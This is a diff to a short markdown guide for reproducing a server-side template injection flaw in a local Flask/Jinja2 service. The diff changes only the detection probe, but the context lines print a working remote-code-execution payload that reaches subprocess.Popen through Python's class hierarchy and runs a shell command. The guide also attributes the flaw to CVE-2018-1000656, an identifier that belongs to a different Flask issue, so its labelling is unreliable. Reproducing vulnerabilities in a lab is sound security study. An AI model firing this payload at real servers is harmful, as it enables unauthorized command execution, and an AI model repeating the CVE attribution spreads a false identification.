@@ -72,8 +72,8 @@ CVE‑2018‑1000656 is Server‑Side Template Injection(SSTI) in Flask Jinja2. 
 ## Vulnerability Reproduction Sequence
 
 1. Start vulnerable service, access `http://127.0.0.1:5001`
-2. SSTI detection payload: `http://127.0.0.1:5001/?name={{7*7}}`
-Vulnerable server outputs `Hello 49`, proves template expression can be executed.
+2. SSTI detection payload: `http://127.0.0.1:5001/?name={{2*10}}`
+Vulnerable server outputs `Hello 20`, proves template expression can be executed.
 3. Traverse object inheritance chain to find subprocess.Popen class.
 4. Remote command execution payload:
 `/?name={{''.__class__.__bases__[0].__subclasses__()[200]('whoami',shell=True,stdout=-1).communicate()[0].decode()}}`
